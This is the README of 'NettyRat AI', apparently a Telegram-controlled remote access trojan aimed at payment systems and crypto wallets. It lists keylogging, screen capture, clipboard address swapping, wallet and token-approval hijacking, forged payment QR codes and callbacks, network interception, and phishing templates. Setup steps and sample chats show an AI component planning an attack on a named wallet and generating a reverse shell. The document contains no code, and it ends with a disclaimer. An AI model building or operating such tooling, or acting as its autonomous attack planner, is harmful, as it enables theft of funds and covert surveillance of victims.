# 🐀 NettyRat AI v4.0

智能攻击框架 - AI 驱动的 Telegram Bot 远程管理工具

## ✨ 特性

- 🤖 **AI 大脑** - 自主分析目标、生成攻击计划、学习优化
- ⚡ **能量系统** - 所有操作消耗能量，自动恢复，策略性使用
- 🗣️ **自然语言** - 用中文/英文直接对话，AI 理解意图
- 🔗 **攻击链** - 可视化多步骤攻击流程，自动优化
- 💾 **记忆系统** - 记住上下文，持续学习用户偏好

## 🎯 攻击模块 (12个)

| 模块 | 功能 |
|------|------|
| QR 伪造 | 生成伪造支付二维码 |
| 签名攻击 | HMAC 暴力破解、篡改、绕过 |
| 金额篡改 | JSON/Base64/URL 金额修改 |
| 回调伪造 | 支付宝/微信/Stripe 回调伪造 |
| 重放攻击 | 请求捕获与重放 |
| SDK Hook | 支付 SDK 函数 Hook |
| 网络拦截 | ARP欺骗、DNS投毒、SSL剥离 |
| 凭证伪造 | JWT 伪造、会话劫持、OAuth |
| 盲签攻击 | 盲签名、离线签名 |
| Gas 优化 | Gas 价格优化、零Gas攻击 |

## 👁️ 监控模块 (5个)

| 模块 | 功能 |
|------|------|
| 屏幕监控 | 截图、录屏、实时直播 |
| 键盘记录 | 键盘/鼠标输入监控 |
| 剪切板 | 剪切板监控与地址替换 |
| 钱包劫持 | 地址检测与自动替换 |
| 授权劫持 | 代币授权扫描与劫持 |

## 🚀 快速开始

```bash
# 1. 克隆项目
git clone https://github.com/Bigboss6797976/ailipay.git
cd NettyRatAI

# 2. 安装依赖
pip install -r requirements.txt

# 3. 设置环境变量
export BOT_TOKEN="你的BotToken"
export ADMIN_IDS="你的TelegramID"
export REPLACE_WALLET="替换钱包地址"

# 4. 运行
python3 bot.py
```

## 🗣️ AI 交互示例

```
用户: 攻击这个钱包 T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb
AI: 🧠 分析完成，推荐攻击计划...

用户: 生成一个反向shell
AI: 🔧 生成 Python Payload...

用户: 监控屏幕和剪切板
AI: 👁️ 启动监控中...

用户: 我的能量还有多少
AI: ⚡ 当前能量: 850/1000
```

## ⚡ 能量系统

所有操作消耗能量，自动恢复：
- 截图: 5
- 键盘记录: 10
- 剪切板监控: 15
- 钱包劫持: 30
- 签名破解: 50
- 回调伪造: 40
- AI 分析: 25
- AI 决策: 40

## 📁 项目结构

```
NettyRatAI/
├── bot.py              # 主程序
├── config.py           # 配置
├── requirements.txt    # 依赖
├── core/               # 核心模块
│   ├── energy.py       # 能量系统
│   ├── encryptor.py    # 加密通信
│   ├── payload.py      # Payload生成
│   └── listener.py     # 反向监听
├── ai_engine/          # AI引擎
│   ├── brain.py        # 决策大脑
│   ├── nlp.py          # 自然语言
│   ├── strategy.py     # 策略生成
│   └── memory.py       # 记忆系统
├── attacks/            # 攻击模块
│   ├── qr_forgery.py
│   ├── signature.py
│   ├── amount_tamper.py
│   ├── callback_spoof.py
│   ├── replay.py
│   ├── sdk_hook.py
│   ├── network_intercept.py
│   ├── credential.py
│   ├── blind_sign.py
│   └── gas_optimizer.py
├── monitors/           # 监控模块
│   ├── screen.py
│   ├── keylogger.py
│   ├── clipboard.py
│   ├── crypto_wallet.py
│   ├── approval_hijack.py
│   └── usdt_qr.py
├── modules/            # 系统模块
│   ├── system.py
│   ├── files.py
│   └── network.py
├── utils/              # 工具
│   ├── crypto_utils.py
│   └── obfuscator.py
└── templates/          # 钓鱼模板
    ├── payment_qr.html
    ├── usdt_transfer.html
    └── auth_page.html
```

## ⚠️ 免责声明

本工具仅用于合法授权的安全测试和研究。任何未经授权使用均属违法。
